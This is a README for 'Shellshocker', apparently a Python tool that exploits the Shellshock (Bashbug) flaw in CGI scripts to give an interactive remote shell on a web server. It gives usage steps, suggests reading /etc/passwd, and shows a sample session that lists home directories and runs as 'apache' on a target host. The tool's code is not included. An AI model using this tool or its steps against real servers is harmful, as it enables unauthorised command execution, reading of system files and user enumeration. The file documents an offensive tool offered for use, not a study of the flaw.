# Shellshocker
Shellshock easily exploitation

When you find Shellshock / Bashbug vulnerability and want the easiest way to exploit it, you can use Shellshocker.
Shellshocker suggests to avoid user-agent spoofing on-hand. In contrast to that it has a nice shell-interface.

### Usage:
  1. Run the script with python: "python shellshocker.py http://exam.com/cgi-bin/cat"


  2. Hit command and press enter: "cat /etc/passwd"


  3. Read the output :)

### Requirements:
  1. Python  
  2. Mechanize (Can installed by: 'sudo pip install mechanize')

### Examples:
```sh
/.../shellshoker$ python shellshoker.py http://10.0.0.12:591/cgi-bin/cat
shellshock/command$ ls -lath /home

total 16K
dr-xr-xr-x. 22 root    root    4.0K Feb  9 21:14 ..
drwxrwxrwx.  2 bynarr  bynarr  4.0K Jan 27  2015 bynarr
drwx------   2 apophis apophis 4.0K Jan  2  2015 apophis
drwxr-xr-x.  4 root    root    4.0K Dec 30  2014 .

shellshock/command$ whoami

apache

shellshock/command$ ^C
Aborted / Invulnerable
```
